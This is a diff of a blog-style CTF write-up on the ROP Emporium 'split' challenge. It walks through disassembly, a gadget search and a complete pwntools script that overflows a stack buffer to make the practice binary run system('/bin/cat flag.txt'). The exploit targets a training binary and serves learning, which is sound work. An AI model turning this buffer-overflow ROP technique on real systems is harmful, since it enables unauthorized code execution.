@@ -1,20 +1,23 @@
 ---
-title: "Return-Oriented Programming - Split"
+title: 'Return-Oriented Programming - Split'
 date: '2021-12-20'
-tags: ['ropemporium','rop', 'pwn']
+tags: ['ropemporium', 'rop', 'pwn']
 draft: false
 summary: Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.
 layout: PostLayout
+images: '/static/images/ropemporium/split.jpg'
+
 canonicalUrl:
 ---
 
 ## Introduction
+
 Challenge Description
 
->The elements that allowed you to complete ret2win are still present, they've just been split apart.
->Find them and recombine them using a short ROP chain
+> The elements that allowed you to complete ret2win are still present, they've just been split apart.
+> Find them and recombine them using a short ROP chain
 
-The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website [ropemporium](https://ropemporium.com). 
+The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website [ropemporium](https://ropemporium.com).
 
 First we check the binary protections enabled on the downloaded. Only **NX** (Not executable) is enabled on the device according to `checksec` binary utility as shown in the image below.
 
@@ -28,6 +31,7 @@ vx@archie:split$ checksec --file=split
 ```
 
 From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble **pwnme** function as in the image below.The function looks familiar as for the ret2win function.
+
 ```nasm
 (gdb) disas pwnme
 Dump of assembler code for function pwnme:
@@ -52,12 +56,13 @@ Dump of assembler code for function pwnme:
    0x0000000000400735 <+77>:	mov    edi,0x40083f
    0x000000000040073a <+82>:	call   0x400550 <puts@plt>
    0x000000000040073f <+87>:	nop
-   0x0000000000400740 <+88>:	leave  
-   0x0000000000400741 <+89>:	ret    
+   0x0000000000400740 <+88>:	leave
+   0x0000000000400741 <+89>:	ret
 End of assembler dump.
-(gdb) 
+(gdb)
 ```
-From the above code, we are filling  a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.
+
+From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. **memset** is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.
 
 ![](/static/images/ropemporium/stack.png)
 
@@ -66,10 +71,11 @@ Next function is **read** function, which reads for user input from the standard
 ```c
 ssize_t read(int fd, void *buf, size_t count);
 ```
+
 For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called **usefulFunction**. The usefulFunction, does listing of the files in the directory when called by the function.
 
 ```nasm
-(gdb) disas usefulFunction 
+(gdb) disas usefulFunction
 Dump of assembler code for function usefulFunction:
    0x0000000000400742 <+0>:	push   rbp
    0x0000000000400743 <+1>:	mov    rbp,rsp
@@ -77,23 +83,24 @@ Dump of assembler code for function usefulFunction:
    0x000000000040074b <+9>:	call   0x400560 <system@plt>
    0x0000000000400750 <+14>:	nop
    0x0000000000400751 <+15>:	pop    rbp
-   0x0000000000400752 <+16>:	ret    
+   0x0000000000400752 <+16>:	ret
 End of assembler dump.
 (gdb) x/s 0x40084a
 0x40084a:	"/bin/ls"
-(gdb) 
+(gdb)
 ```
-Goal is to pass a different string to the system function instead of  **"/bin/ls"**
+
+Goal is to pass a different string to the system function instead of **"/bin/ls"**
 
 From the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.
 
->Now that you've gathered the elements of your exploit you can start to piece them together, you want to call system() with the **"/bin/cat flag.txt"** string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions. 
+> Now that you've gathered the elements of your exploit you can start to piece them together, you want to call system() with the **"/bin/cat flag.txt"** string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions.
 
 Opening the binary in radare2, we can use **iz** command to look for strings. The goal is to read the flag from the system.
 
 ```nasm
 [0x004005b0]> iz
-nth paddr      vaddr      len size section type  string                                      
+nth paddr      vaddr      len size section type  string
 ---------------------------------------------------------------------------------------------
 0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
 1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
@@ -121,9 +128,10 @@ Now we need to chain ropchain exploit as shown in the image below.
 
 ![ropchain](/static/images/ropemporium/popgadget.png)
 
-The goal is to overwrite the return address with the address of **"pop rdi, ret "** and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and  8 bytes teo overwrite the return address with pop rdi address.
+The goal is to overwrite the return address with the address of **"pop rdi, ret "** and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and 8 bytes teo overwrite the return address with pop rdi address.
 
 ## Exploit
+
 Full exploit of split challenge is;
 
 ```python
@@ -135,15 +143,15 @@ pwn.context.arch = "amd64"
 
 io = pwn.process("./split")
 
-system_addr = pwn.p64(0x400560)   #address of system 
-pop_rdi_ret = pwn.p64(0x004007c3)  # pop rdi; ret gadget 
-bin_cat_addr = pwn.p64(0x00601060)  #bin cat flag.txt address 
+system_addr = pwn.p64(0x400560)   #address of system
+pop_rdi_ret = pwn.p64(0x004007c3)  # pop rdi; ret gadget
+bin_cat_addr = pwn.p64(0x00601060)  #bin cat flag.txt address
 
-payload = b"A" * 32  #fill the buffer 
+payload = b"A" * 32  #fill the buffer
 payload += b"B" *8   # overwrite  rbp
-payload += pop_rdi_ret # pop rdi gadget 
+payload += pop_rdi_ret # pop rdi gadget
 payload += bin_cat_addr # argument passed to the system function
-payload += system_addr   #call system 
+payload += system_addr   #call system
 
 io.writeafter('>', payload)
 
@@ -154,4 +162,4 @@ Running the above code we get a flag.
 
 ![](/static/images/ropemporium/split_flag.png)
 
->**To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.**
+> **To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.**
